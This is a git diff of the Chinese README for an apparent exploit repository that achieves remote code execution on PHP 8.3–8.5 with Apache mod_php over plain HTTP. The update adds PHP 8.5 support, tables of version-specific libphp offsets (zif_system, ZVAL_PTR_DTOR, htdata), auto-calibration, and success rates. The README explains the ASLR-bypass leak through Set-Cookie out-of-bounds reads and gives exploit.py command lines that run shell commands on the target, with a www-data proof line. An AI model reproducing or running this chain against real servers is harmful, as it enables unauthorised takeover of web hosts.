@@ -5,10 +5,10 @@
 
 **纯远程、仅用 HTTP 对 PHP 8.4.26 + Apache prefork + mod_php 的 RCE —— 绕过 ASLR、目标页面无 `session_start()`、不在目标侧写任何 PHP。**
 
-[![PHP](https://img.shields.io/badge/PHP-8.4.26-777BB4?logo=php&logoColor=white)](https://hub.docker.com/_/php)
+[![PHP](https://img.shields.io/badge/PHP-8.3%20%7C%208.4%20%7C%208.5-777BB4?logo=php&logoColor=white)](https://hub.docker.com/_/php)
 [![Apache](https://img.shields.io/badge/Apache-2.4%20prefork-D22128?logo=apache&logoColor=white)](https://httpd.apache.org/)
 [![Platform](https://img.shields.io/badge/platform-linux%2Famd64-informational)](#环境要求)
-[![Status](https://img.shields.io/badge/official%20image-3%2F3%20RCE-success)](#复现结果)
+[![Status](https://img.shields.io/badge/8.4%20%26%208.5-RCE%20verified-success)](#复现结果)
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 
 [English](README.md)&nbsp;|&nbsp;中文
@@ -59,7 +59,10 @@ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - **绕过 ASLR。** 两次 `Set-Cookie` 越界读在运行时恢复 chunk 和 `libphp` 基址；终端阶段调用 `libphp`
   内的 `zif_system`，完全不依赖 libc。
 - **无需编译目标。** 环境就是官方 `php:8.4.26-apache` 镜像加若干配置挂载，没有 `docker build`。
-- **偏移自标定。** 对本机容器会直接从 `libphp.so` 读取符号偏移，更换或升级镜像后无需手改。
+- **多版本。** 同一条链在官方 **8.4** 和 **8.5** 镜像上都能稳定拿到 RCE；唯一与版本相关的只是一个 chunk
+  相对偏移，本机运行时会自动选好。
+- **偏移自标定。** 对本机容器会直接从 `libphp.so` 读取符号偏移，并在每次运行时刷新（换镜像也不会残留旧值），
+  更换或升级镜像后无需手改。
 
 ## 环境要求
 
@@ -102,11 +105,22 @@ python3 exploit.py -u http://127.0.0.1:8088/index.php
 
 ## 复现结果
 
-在官方 `php:8.4.26-apache` 镜像（即本仓库 `docker/` 靶场）、`linux/amd64` 上实测：
+在官方 PHP `-apache` 镜像（均为 Debian 12 bookworm）、`linux/amd64` 上,用本仓库 `docker/` 靶场把
+`PHP_IMAGE` 指向各版本实测：
 
-| Profile | 目标 | 结果 |
-| --- | --- | --- |
-| `bookworm`（默认） | 官方 `php:8.4.26-apache` | **3 / 3** 一键 RCE |
+| PHP 版本 | Profile | libphp 偏移 | 阶段 1–2 泄漏 | 阶段 3 RCE |
+| --- | --- | --- | --- | --- |
+| **8.4.26** | `bookworm`（默认） | 自动 `0x465370` / `0x65eb60` | 稳定 | ✅ **3 / 3** 一键 |
+| **8.5.11** | `bookworm`（默认） | 自动 `0x5996e0` / `0x7b47a0` | 稳定 | ✅ **6 / 6** 一键 |
+| **8.3.35** | `bookworm83`（本机自动选） | 自动 `0x3ac080` / `0x49ec50` | 稳定（10 / 10） | ⚠️ 偶发 —— 见[边界与限制](#边界与限制) |
+
+libphp 符号偏移在运行时从各镜像读取,因此只有 chunk 相对的 `htdata` 偏移与版本有关：8.4/8.5 为 `0x690d8`,
+8.3 为 `0x6a0d8`。把靶场指向其他版本：
+
+```bash
+PHP_IMAGE=php:8.5-apache docker compose -f docker/docker-compose.yml up -d --force-recreate
+python3 exploit.py -u http://127.0.0.1:8088/index.php   # 命令不变,偏移自动调整
+```
 
 ## 原理
 
@@ -153,18 +167,25 @@ php_session_track_init()
 
 | Profile | 目标构建 | `zif_system` | `ZVAL_PTR_DTOR` | `htdata` | stage1 / stage2 |
 | --- | --- | --- | --- | --- | --- |
-| **`bookworm`**（默认） | 官方 `php:8.4.26-apache`（Debian 12，Apache 2.4.69） | `0x465370` | `0x65eb60` | `0x690d8` | `n=841`、`t=406`、`v=16` |
+| **`bookworm`**（默认） | 官方 `php:8.4`/`8.5-apache`（Debian 12） | `0x465370` | `0x65eb60` | `0x690d8` | `n=841`、`t=406`、`v=16` |
+| `bookworm83` | 官方 `php:8.3-apache`（Debian 12） | `0x3ac080` | `0x49ec50` | `0x6a0d8` | `n=841`、`t=406`、`v=16` |
 | `lab` | 自编译（Apache 2.4.68，最小 PHP） | `0x43a870` | `0x613c50` | `0x6e0d8` | `n=892`、`t=443`、`v=1` |
 
 偏移取值优先级（从高到低）：
 
 1. **命令行** —— `--zif-offset` / `--dtor-offset` / `--htdata-offset`。
-2. **偏移文件** —— `out/offsets.env`，对本机容器由 `docker/offsets.py` 自动写入（仅 libphp 偏移）。
+2. **偏移文件** —— `out/offsets.env`，对本机容器由 `docker/offsets.py` 写入（仅 libphp 偏移；每次本机运行都刷新，不会残留旧值）。
 3. **profile 默认值** —— 上表实测值。
 
-由于每个 profile 现在都带有自己正确的 libphp 默认值，`bookworm` profile 对**远程**官方镜像目标也能开箱即用，
-即便 `docker/offsets.py` 无法运行（它只能访问本机容器）。用 `--profile lab` 切换 profile；用
-`--offsets-file '' --no-auto-offsets` 关闭自动读取。
+两个便利设计让多版本使用零配置：
+
+- **htdata 随版本自动。** 对本机容器,exp 会读取 PHP 小版本号,在默认 profile 下对 8.3 自动采用 `bookworm83`
+  的 `htdata` —— 因此同一条命令适配 8.3 / 8.4 / 8.5,无需加任何参数。
+- **每个 profile 自带 libphp 默认值。** 因此对相应构建的**远程**目标也能开箱即用,即便 `docker/offsets.py`
+  无法运行（它只能访问本机容器）。
+
+用 `--profile bookworm83` / `--profile lab` 切换 profile；用 `--offsets-file '' --no-auto-offsets`
+关闭自动读取。
 
 ## 执行任意命令
 
@@ -182,7 +203,7 @@ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
 | --- | --- | --- |
 | `-u`, `--url` | *(必填)* | 目标 PHP 页面，如 `http://127.0.0.1:8088/index.php` |
 | `-c`, `--cmd` | `id>/out/p1` | 要执行的命令（最多 14 字节） |
-| `--profile` | `bookworm` | 构建 profile：`bookworm`（官方镜像）或 `lab` |
+| `--profile` | `bookworm` | 构建 profile：`bookworm`（8.4/8.5）、`bookworm83`（8.3）或 `lab` |
 | `--proof-file` | `out/p1` | 利用后回读的本机文件（`''` 关闭） |
 | `--fetch` | *(关闭)* | 利用后 `GET` 此路径（用于写入 web 根目录的命令） |
 | `--zif-offset` / `--dtor-offset` / `--htdata-offset` | *(profile)* | 覆盖单个偏移 |
@@ -238,6 +259,8 @@ php2shell/
 
 - 当前 RCE 要求 `display_errors=1`、`memory_limit=8M`、`max_input_vars=1000`、
   `session.use_cookies=1`、`session.use_strict_mode=0`、单 worker prefork。
+- **PHP 8.3 为实验性。** 在 `php:8.3-apache` 上 ASLR 泄漏（阶段 1–2）完全稳定，但阶段 3 的命令执行在 8.4
+  标定的 grooming 下只能偶发命中 —— 8.3 需要自己的阶段 3 标定。稳定 RCE 目前只在 **8.4** 和 **8.5** 上验证。
 - `display_errors=0` 下纯 HTTP 堆泄漏可行，但该配置的完整 RCE 未包含在此
   （见 [docs/DISPLAY_ERRORS_OFF.md](docs/DISPLAY_ERRORS_OFF.md)）。
 - 偏移为 x86-64；不同架构或重新编译的 `libphp.so` 会使其漂移（用 `docker/offsets.py` 或 `--*-offset`）。
@@ -245,8 +268,9 @@ php2shell/
 ## 致谢
 
 原始漏洞研究与 PoC 由 [**@9bie**](https://github.com/9bie/php2shell-bypass-aslr-exp) 完成。本仓库在自带
-Docker 靶场中复现该工作，重构了各 profile 的偏移组织，并修复了 `out/` 的权限处理，使官方镜像流程可以从冷启动
-干净地自标定。
+Docker 靶场中复现该工作，把各 profile 的偏移重构进一张带类型的表，将利用链扩展到 PHP **8.5**（以及 8.3 的
+泄漏路径），加入运行时偏移自动读取与随版本自动选择 `htdata`，并修复了 `out/` 的权限处理，使官方镜像流程可以从
+冷启动干净地自标定。
 
 ## 许可证
 
